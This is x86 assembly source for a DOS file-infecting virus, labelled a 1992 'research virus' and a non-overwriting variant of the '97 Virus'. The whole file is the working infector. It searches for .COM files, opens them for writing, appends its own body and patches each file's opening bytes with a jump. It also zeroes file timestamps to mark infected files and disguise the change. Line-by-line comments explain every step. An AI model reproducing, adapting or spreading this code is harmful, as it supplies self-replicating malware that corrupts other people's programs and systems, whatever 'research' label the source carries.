;***************************************************************************
;*                                                                         *
;*  196 - Research Virus Version 1.01               Date. 11th April 1992. *
;*                                                                         *
;*  Written By : F.Deakin (ACE COMPUTER SYSTEMS)                           *
;*                                                                         *
;*  Non-Overwriting Version of 97 Virus                                    *
;*                                                                         *
;***************************************************************************

CODE  Segment
      Assume CS:CODE

progr equ 100h

      org progr

virus_size    EQU vir_end-vir_start
variable_diff EQU variables_start-next_byte

highlander:
      call vir_start                     ;call virus
      mov ah,4ch                         ;return to operating system
      int 21h                            ;thru' dos interrupt 21h

vir_start:
      call next_byte                     ;call next address

next_byte:
      pop ax                             ;get virus address
      pop di                             ;get program start address
      push ax                            ;save virus address

      pop si                             ;get address of next_byte
      mov ax,variable_diff               ;add difference
      add si,ax                          ;get variables address

      mov ax,3                           ;move to old address
      sub di,ax                          ;start of .com file
      add si,ax                          ;point to old code
      mov ax,[si]                        ;get two bytes from old code
      mov [di],ax                        ;and place at start of file
      inc si                             ;increment to third byte
      inc si                             ;
      inc di                             ;increment to third address to save
      inc di                             ;
      mov al,[si]                        ;get last byte of old code
      mov [di],al                        ;and place at start of .COM file
      mov ax,5                           ;five bytes out
      sub si,ax                          ;back to start of variables
  
      mov di,si                          ;which is copied to destination
      mov ax,6                           ;add 6 to variables address
      add di,ax                          ;and save file control block

;search for first
      mov ah,4eh                         ;search for first
      xor cx,cx                          ;attributes to search
      mov dx,di                          ;point to fcb
      int 21h                            ;call dos
      jc return_to_prog                  ;if no file found return to program

found_one:
      mov ah,2fh                         ;get DTA address into es:bx
      int 21h                            ;call dos
      mov ax,22                          ;jump over to time
      add bx,ax                          ;and point to it
      mov al,es:[bx]                     ;and place in ax
      and al,00000111b                   ;get seconds only
      cmp al,00h                         ;zero seconds?
      jnz infect_program                 ;if not infect program
      mov ah,4fh                         ;find next file
      int 21h                            ;call dos
      jmp short found_one                ;jump back

infect_program:
      mov ax,8                           ;jump to asciiz fcb
      add ax,bx                          ;add to bx
      mov dx,ax                          ;and move to dx
      mov ax,3d02h                       ;open file for writing
      int 21h                            ;call dos
      jnc continue                       ;continue if no error

      mov ah,4fh                         ;search for next
      xor cx,cx                          ;attributes to search
      int 21h                            ;call dos
      jc return_to_prog                  ;if no file found return to program
      jmp short found_one                ;jump forward if one found

continue:
      mov bx,ax                          ;transfer file handle to bx

;read first three bytes
      mov ah,3fh                         ;read file
      mov cx,3                           ;number of bytes to read
      mov dx,3                           ;three bytes to old_code
      add dx,si                          ;point to buffer to read
      int 21h                            ;call dos

      mov ax,4202h                       ;move file pointer to end of file
      xor cx,cx                          ;clear cx
      xor dx,dx                          ;clear dx
      int 21h                            ;call dos
      dec ax                             ;decrement ax
      dec ax                             ;
      dec ax                             ;
      dec si                             ;save address
      mov word [si],ax                   ;and store

      mov ah,40h                         ;write to file
      mov cx,virus_size                  ;set counter to write
      mov dx,offset vir_start            ;point to buffer to start
      int 21h                            ;and write to file

      mov ax,4200h                       ;move file pointer to start of file
      xor cx,cx                          ;clear cx
      xor dx,dx                          ;clear dx
      int 21h                            ;call dos

      mov ah,40h                         ;write to file
      mov cx,3                           ;set counter to write
      inc si                             ;point to jump address
      mov dx,si                          ;point to buffer to start
      int 21h                            ;and write to file

      mov ax,5701h                       ;set date & time
      xor cx,cx                          ;time set to zero
      xor dx,dx                          ;and date
      int 21h                            ;and do it
      mov ah,3eh                         ;close file
      int 21h                            ;thru' dos

return_to_prog:
      mov ah,4ch                         ;terminate program
      int 21h                            ;exit to dos

variables_start:
jump_add:
      db 0e8h,0,0
old_code:
      db 90h,90h,90h
fcb:
      db "*.COM",0
variables_end:

vir_end:

CODE   ENDS

       END highlander

